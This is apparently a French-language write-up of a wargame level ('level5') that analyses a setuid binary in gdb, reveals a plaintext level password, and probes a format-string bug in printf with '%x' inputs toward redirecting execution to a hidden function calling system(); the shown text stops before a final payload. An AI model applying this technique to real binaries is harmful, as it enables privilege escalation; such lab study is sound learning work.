# Level5

> login:password -> *`level5:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`*
```
:~$ su level5
Password:0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
---

```
:~$ pwd
/home/user/level5
```

```
:~$ ls -la
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level5
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile
```

Le Home contient un binaire `level5` :

```
:~$ ./level5
(input) test
test

:~$ ./level5 test
(input) test
test
```

Avec ou sans paramètre, le binaire attends un input

```
:~$ gdb level5
...

(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	    push   %ebp
   0x08048505 <+1>:	    mov    %esp,%ebp
   0x08048507 <+3>:	    and    $0xfffffff0,%esp
   0x0804850a <+6>:	    call   0x80484c2 <n>
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.

(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

fonction `n()` (+6)
n -> fonction `printf()` (+49)
pas de fonction `system()` ou autre moyen d'acceder au stdin, donc on va voir si on trouve d'autres fonctions utiles


```
(gdb) info functions
All defined functions:

Non-debugging symbols:
(...)
0x08048380  printf@plt
(...)
0x08048390  _exit@plt
(...)
0x080483a0  fgets@plt
(...)
0x080483b0  system@plt
(...)
0x080483d0  exit@plt
(...)
0x080484a4  o
0x080484c2  n
0x08048504  main
(...)
```

Finalement on retrouve bien l'utilisation d'une fonction `system()`, mais egalement l'utilisation d'une fonction `o()` qui semble inexploitee

```
(gdb) disas o
Dump of assembler code for function o:
   (...)
   0x080484aa <+6>:	    movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
   0x080484b6 <+18>:	movl   $0x1,(%esp)
   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
End of assembler dump.
```

On determine du coup que la fonction `o()` pourra etre utilise pour atteindre le stdin, mais pour ce faire on va de nouveau exploiter `printf()`

```
:~$ echo "%x %x %x %x" | ./level5
200 b7fd1ac0 b7ff37d0 25207825

:~$ echo "aaaa %x %x %x %x" | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161
```

Notre buffer est en 4e position

```
(gdb) info function exit
All defined functions:

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt
0x080483d0  exit
0x080483d0  exit@plt

(gdb) info function o
All defined functions:

Non-debugging symbols:
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x08048420  __do_global_dtors_aux
0x080484a4  o
0x080485a0  __do_global_ctors_aux
```

...